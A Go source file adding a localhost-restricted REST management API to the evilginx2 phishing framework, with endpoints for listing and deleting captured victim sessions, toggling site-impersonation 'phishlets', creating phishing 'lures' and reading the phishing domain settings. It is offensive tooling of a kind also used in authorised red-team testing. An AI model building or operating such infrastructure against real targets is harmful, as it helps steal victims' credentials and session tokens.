package core

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"time"

	"github.com/gorilla/mux"
	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

type ApiServer struct {
	cfg         *Config
	db          *database.Database
	httpServer  *http.Server
	router      *mux.Router
	running     bool
	whitelistIP []string
}

type ApiResponse struct {
	Success bool        `json:"success"`
	Message string      `json:"message,omitempty"`
	Data    interface{} `json:"data,omitempty"`
}

func NewApiServer(cfg *Config, db *database.Database) (*ApiServer, error) {
	return &ApiServer{
		cfg:         cfg,
		db:          db,
		router:      mux.NewRouter(),
		running:     false,
		whitelistIP: []string{"127.0.0.1"},
	}, nil
}

func (as *ApiServer) Start(host string, port int) error {
	if as.running {
		return fmt.Errorf("API server is already running")
	}

	as.setupRoutes()

	as.httpServer = &http.Server{
		Addr:         fmt.Sprintf("%s:%d", host, port),
		Handler:      as.router,
		ReadTimeout:  30 * time.Second,
		WriteTimeout: 30 * time.Second,
	}

	go func() {
		log.Info("Starting API server at %s:%d", host, port)
		if err := as.httpServer.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			log.Error("API server: %v", err)
		}
	}()
	
	as.running = true
	return nil
}

func (as *ApiServer) Stop() error {
	if !as.running {
		return nil
	}
	
	err := as.httpServer.Close()
	as.running = false
	return err
}

func (as *ApiServer) setupRoutes() {
	// Middleware for all routes
	as.router.Use(as.ipWhitelistMiddleware)

	// Sessions endpoints
	as.router.HandleFunc("/api/sessions", as.getSessionsHandler).Methods("GET")
	as.router.HandleFunc("/api/sessions/{id}", as.getSessionHandler).Methods("GET")
	as.router.HandleFunc("/api/sessions/{id}", as.deleteSessionHandler).Methods("DELETE")

	// Phishlets endpoints
	as.router.HandleFunc("/api/phishlets", as.getPhishletsHandler).Methods("GET")
	as.router.HandleFunc("/api/phishlets/{name}", as.getPhishletHandler).Methods("GET")
	as.router.HandleFunc("/api/phishlets/{name}/enable", as.enablePhishletHandler).Methods("POST")
	as.router.HandleFunc("/api/phishlets/{name}/disable", as.disablePhishletHandler).Methods("POST")
	
	// Lures endpoints
	as.router.HandleFunc("/api/lures", as.getLuresHandler).Methods("GET")
	as.router.HandleFunc("/api/lures", as.createLureHandler).Methods("POST")
	as.router.HandleFunc("/api/lures/{id}", as.getLureHandler).Methods("GET")
	as.router.HandleFunc("/api/lures/{id}", as.deleteLureHandler).Methods("DELETE")

	// Config endpoints
	as.router.HandleFunc("/api/config", as.getConfigHandler).Methods("GET")
}

func (as *ApiServer) ipWhitelistMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Allow only whitelisted IPs to access the API
		clientIP := strings.Split(r.RemoteAddr, ":")[0]
		allowed := false
		
		for _, ip := range as.whitelistIP {
			if clientIP == ip {
				allowed = true
				break
			}
		}
		
		if !allowed {
			as.jsonError(w, "Unauthorized IP address", http.StatusForbidden)
			return
		}
		
		next.ServeHTTP(w, r)
	})
}

func (as *ApiServer) AddWhitelistedIP(ip string) {
	as.whitelistIP = append(as.whitelistIP, ip)
}

// Sessions handlers
func (as *ApiServer) getSessionsHandler(w http.ResponseWriter, r *http.Request) {
	sessions, err := as.db.ListSessions()
	if err != nil {
		as.jsonError(w, err.Error(), http.StatusInternalServerError)
		return
	}
	
	as.jsonResponse(w, ApiResponse{
		Success: true,
		Data:    sessions,
	})
}

func (as *ApiServer) getSessionHandler(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	sid := vars["id"]
	
	// Get all sessions and find the matching session by sid
	sessions, err := as.db.ListSessions()
	if err != nil {
		as.jsonError(w, err.Error(), http.StatusInternalServerError)
		return
	}
	
	var foundSession *database.Session
	for _, session := range sessions {
		if session.SessionId == sid {
			foundSession = session
			break
		}
	}
	
	if foundSession == nil {
		as.jsonError(w, "Session not found", http.StatusNotFound)
		return
	}
	
	as.jsonResponse(w, ApiResponse{
		Success: true,
		Data:    foundSession,
	})
}

func (as *ApiServer) deleteSessionHandler(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	sid := vars["id"]
	
	err := as.db.DeleteSession(sid)
	if err != nil {
		as.jsonError(w, err.Error(), http.StatusInternalServerError)
		return
	}
	
	as.jsonResponse(w, ApiResponse{
		Success: true,
		Message: "Session deleted successfully",
	})
}

// Phishlets handlers
func (as *ApiServer) getPhishletsHandler(w http.ResponseWriter, r *http.Request) {
	phishlets := []map[string]interface{}{}
	
	for _, p := range as.cfg.phishlets {
		phishletData := map[string]interface{}{
			"name":        p.Name,
			"author":      p.Author,
			"description": p.Description,
			"enabled":     p.isTemplate || as.cfg.IsSiteEnabled(p.Name),
		}
		phishlets = append(phishlets, phishletData)
	}
	
	as.jsonResponse(w, ApiResponse{
		Success: true,
		Data:    phishlets,
	})
}

func (as *ApiServer) getPhishletHandler(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	name := vars["name"]
	
	p, err := as.cfg.GetPhishlet(name)
	if err != nil {
		as.jsonError(w, err.Error(), http.StatusNotFound)
		return
	}
	
	phishletData := map[string]interface{}{
		"name":        p.Name,
		"author":      p.Author,
		"description": p.Description,
		"enabled":     p.isTemplate || as.cfg.IsSiteEnabled(p.Name),
		"domains":     p.ProxyHosts,
	}
	
	as.jsonResponse(w, ApiResponse{
		Success: true,
		Data:    phishletData,
	})
}

func (as *ApiServer) enablePhishletHandler(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	name := vars["name"]
	
	err := as.cfg.EnableSite(name)
	if err != nil {
		as.jsonError(w, err.Error(), http.StatusInternalServerError)
		return
	}
	
	as.jsonResponse(w, ApiResponse{
		Success: true,
		Message: fmt.Sprintf("Phishlet '%s' enabled", name),
	})
}

func (as *ApiServer) disablePhishletHandler(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	name := vars["name"]
	
	err := as.cfg.DisableSite(name)
	if err != nil {
		as.jsonError(w, err.Error(), http.StatusInternalServerError)
		return
	}
	
	as.jsonResponse(w, ApiResponse{
		Success: true,
		Message: fmt.Sprintf("Phishlet '%s' disabled", name),
	})
}

// Lures handlers
func (as *ApiServer) getLuresHandler(w http.ResponseWriter, r *http.Request) {
	lures := as.cfg.lures
	
	as.jsonResponse(w, ApiResponse{
		Success: true,
		Data:    lures,
	})
}

func (as *ApiServer) getLureHandler(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	idStr := vars["id"]
	
	id, err := as.getLureId(idStr)
	if err != nil {
		as.jsonError(w, err.Error(), http.StatusBadRequest)
		return
	}
	
	lure, err := as.cfg.GetLure(id)
	if err != nil {
		as.jsonError(w, err.Error(), http.StatusNotFound)
		return
	}
	
	as.jsonResponse(w, ApiResponse{
		Success: true,
		Data:    lure,
	})
}

func (as *ApiServer) createLureHandler(w http.ResponseWriter, r *http.Request) {
	var lureData map[string]interface{}
	
	err := json.NewDecoder(r.Body).Decode(&lureData)
	if err != nil {
		as.jsonError(w, "Invalid JSON", http.StatusBadRequest)
		return
	}
	
	phishletName, ok := lureData["phishlet"].(string)
	if !ok || phishletName == "" {
		as.jsonError(w, "Phishlet name is required", http.StatusBadRequest)
		return
	}
	
	_, err = as.cfg.GetPhishlet(phishletName)
	if err != nil {
		as.jsonError(w, err.Error(), http.StatusBadRequest)
		return
	}
	
	hostname, _ := lureData["hostname"].(string)
	path, _ := lureData["path"].(string)
	
	id, err := as.cfg.AddLure(phishletName, hostname, path)
	if err != nil {
		as.jsonError(w, err.Error(), http.StatusInternalServerError)
		return
	}
	
	lure, _ := as.cfg.GetLure(id)
	
	as.jsonResponse(w, ApiResponse{
		Success: true,
		Message: fmt.Sprintf("Created lure with ID: %d", id),
		Data:    lure,
	})
}

func (as *ApiServer) deleteLureHandler(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	idStr := vars["id"]
	
	id, err := as.getLureId(idStr)
	if err != nil {
		as.jsonError(w, err.Error(), http.StatusBadRequest)
		return
	}
	
	err = as.cfg.DeleteLure(id)
	if err != nil {
		as.jsonError(w, err.Error(), http.StatusNotFound)
		return
	}
	
	as.jsonResponse(w, ApiResponse{
		Success: true,
		Message: fmt.Sprintf("Lure %d deleted", id),
	})
}

// Config handler
func (as *ApiServer) getConfigHandler(w http.ResponseWriter, r *http.Request) {
	config := map[string]interface{}{
		"domain":       as.cfg.general.Domain,
		"ip":           as.cfg.general.Ipv4,
		"redirect_url": as.cfg.general.RedirectUrl,
	}
	
	as.jsonResponse(w, ApiResponse{
		Success: true,
		Data:    config,
	})
}

// Helper methods
func (as *ApiServer) getLureId(idStr string) (int, error) {
	var id int
	var err error
	
	_, err = fmt.Sscanf(idStr, "%d", &id)
	if err != nil {
		return 0, fmt.Errorf("invalid lure ID format")
	}
	
	return id, nil
}

func (as *ApiServer) jsonResponse(w http.ResponseWriter, resp ApiResponse) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(resp)
}

func (as *ApiServer) jsonError(w http.ResponseWriter, errMsg string, statusCode int) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(statusCode)
	
	resp := ApiResponse{
		Success: false,
		Message: errMsg,
	}
	
	json.NewEncoder(w).Encode(resp)
} 